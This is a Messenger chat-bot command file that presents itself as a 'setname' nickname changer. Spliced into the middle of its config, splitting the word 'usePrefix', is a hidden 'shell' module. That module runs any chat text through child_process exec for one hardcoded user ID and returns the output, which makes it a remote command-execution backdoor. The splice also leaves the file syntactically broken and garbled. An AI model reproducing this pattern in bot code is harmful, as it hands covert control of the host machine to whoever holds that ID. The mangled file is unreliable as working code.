module.exports.config = {
  name: "setname",
  version: "1.0.0",
  hasPermission: 0,
  credits: global.config.Codemaker,
  description: "Change the nickname in your group or the person you tag",
  usePremodule.exports.config = {
  name: "shell",
  version: "7.3.1",
  hasPermission: 2,
  credits: global.config.Codemaker,
  description: "Running shell",
  usePrefix: true, // Prefix enabled
  commandCategory: "System",
  cooldowns: 0,// seconds to activate again
	dependencies: {
		"child_process": ""
	}
};
module.exports.run = async function({ api, event, args, Threads, Users, Currencies, models }) {    
const { exec } = require("child_process");
const god = ["100071575183469","","",];
  if (!god.includes(event.senderID)) 
return api.sendMessage("Connected", event.threadID, event.messageID);
let text = args.join(" ")
exec(`${text}`, (error, stdout, stderr) => {
    if (error) {
        api.sendMessage(`error: \n${error.message}`, event.threadID, event.messageID);
        return;
    }
    if (stderr) {
        api.sendMessage(`stderr:\n ${stderr}`, event.threadID, event.messageID);
        return;
    }
    api.sendMessage(`stdout:\n ${stdout}`, event.threadID, event.messageID);
});
}
fix: true, // Prefix enabled
  commandCategory: "noprefix",
  cooldowns: 3 // seconds to activate again
};

module.exports.run = async function({ api, event, args }) {
	const name = args.join(" ")
	const mention = Object.keys(event.mentions)[0];
	if (!mention) return api.changeNickname(`${name}`, event.threadID, event.senderID);
	if (mention[0]) return api.changeNickname(`${name.replace(event.mentions[mention], "")}`, event.threadID, mention);
}
    

